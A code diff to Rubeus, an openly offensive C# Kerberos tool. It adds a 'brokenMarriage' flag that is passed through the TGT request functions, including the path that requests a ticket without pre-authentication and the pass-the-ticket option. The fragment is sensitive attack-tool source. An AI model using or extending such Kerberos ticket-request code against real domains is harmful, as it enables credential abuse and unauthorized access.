@@ -32,7 +32,7 @@ namespace Rubeus {
 
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null, string service = null, Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, string principalType="principal")
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null, string service = null, Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, string principalType="principal", bool brokenMarriage = false)
         {
             // send request without Pre-Auth to emulate genuine traffic
             bool preauth = false;
@@ -40,7 +40,7 @@ namespace Rubeus {
             {
                 try
                 {
-                    preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true, proxyUrl, service, suppEtype, opsec, principalType);
+                    preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true, proxyUrl, service, suppEtype, opsec, principalType, brokenMarriage);
                 }
                 catch (KerberosErrorException) { }
             }
@@ -52,7 +52,7 @@ namespace Rubeus {
                 {
                     Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               
                     Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
-                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac, service, suppEtype, principalType);
+                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac, service, suppEtype, principalType, brokenMarriage);
                     return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey, false, proxyUrl);
                 }
             }
@@ -76,10 +76,10 @@ namespace Rubeus {
             return null;
         }
 
-        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, string proxyUrl = null, string service = "", Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, bool opsec = true, string principalType="principal")
+        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, string proxyUrl = null, string service = "", Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, bool opsec = true, string principalType="principal", bool brokenMarriage = false)
         {
             byte[] response = null;
-            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(userName, domain, suppEtype, opsec, service, principalType);
+            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(userName, domain, suppEtype, opsec, service, principalType, brokenMarriage);
           
             byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();
 
